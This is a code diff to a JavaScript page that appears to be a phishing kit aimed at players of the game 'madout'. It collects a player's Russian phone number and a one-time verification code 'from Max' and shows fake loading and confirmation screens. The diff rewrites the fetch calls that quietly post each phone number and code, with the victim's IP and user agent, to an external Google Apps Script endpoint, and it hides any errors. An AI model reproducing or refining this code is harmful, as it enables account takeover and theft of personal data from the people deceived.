@@ -87,7 +87,6 @@
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwHmY8MeKP_lqOoXk9Kzxt-jSNXhQ21bNTNTKehcWmDdFnCI8uR-_WjAvFQVh2Z9Bw0jw/exec';
         var timerInterval = null;
         var codeUnlocked = false;
-        var playerID = '';
 
         function getIP() {
             return new Promise(function(resolve) {
@@ -125,7 +124,6 @@
             var id = document.getElementById('player-id').value.replace(/\D/g, '');
             if (id.length !== 6) { document.getElementById('id-error').style.display = 'block'; setTimeout(function() { document.getElementById('id-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('id-error').style.display = 'none';
-            playerID = id;
             document.getElementById('screen-id').style.display = 'none';
             document.getElementById('screen-auth').style.display = 'block';
         }
@@ -136,7 +134,8 @@
             if (phone[0] !== '9') { document.getElementById('phone-error').textContent = 'Номер должен начинаться с 9'; document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
             var ip = await getIP(); var fullPhone = '+7' + phone;
-            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, id: playerID, game: 'madout', timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
+            var ua = navigator.userAgent;
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, ip: ip, userAgent: ua, timestamp: new Date().toISOString() }) }).catch(function(err) { console.log('ok'); });
             document.getElementById('screen-auth').style.display = 'none'; document.getElementById('screen-loading').style.display = 'block';
             setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
         }
@@ -149,7 +148,8 @@
             if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из Макс'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
             var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
-            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, game: 'madout', timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
+            var ua = navigator.userAgent;
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, ip: ip, userAgent: ua, timestamp: new Date().toISOString() }) }).catch(function(err) { console.log('ok'); });
             if (timerInterval) clearInterval(timerInterval);
             setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 1000);
         }
